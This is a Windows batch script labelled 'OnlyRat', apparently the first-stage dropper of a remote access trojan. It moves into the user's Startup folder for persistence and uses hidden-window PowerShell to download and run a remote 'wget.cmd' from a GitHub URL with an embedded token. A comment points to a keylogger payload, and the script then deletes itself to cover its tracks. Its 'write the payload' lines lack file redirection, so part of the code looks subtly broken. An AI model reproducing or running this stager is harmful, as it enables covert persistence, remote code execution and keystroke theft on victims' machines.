@echo off
@REM initial Staging
@REM OnlyRat By Unknown

@REM Variables
set "initial_path=%cd%"
set "startup_path=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

@REM startup directory 
cd "%startup_path%"

@REM Write the payload into the startup directory
echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'raw.githubusercontent.com/aksruganda/OnlyRay/main/wget.cmd?token=GHSAT0AAAAAACUVQES2BRTQEIZSY4F23CLMZUOIVYQ'  -OutFile 'wget.cmd' "
echo pause
@REM https://raw.githubusercontent.com/CosmodiumCS/payloads/main/rubberducky/DucKey-Logger/p.ps1


@REM run the payload
powershell ./wget.cmd

@REM cd to our initial location
cd "%initial_path%"

@REM delete itself
del Initial.cmd

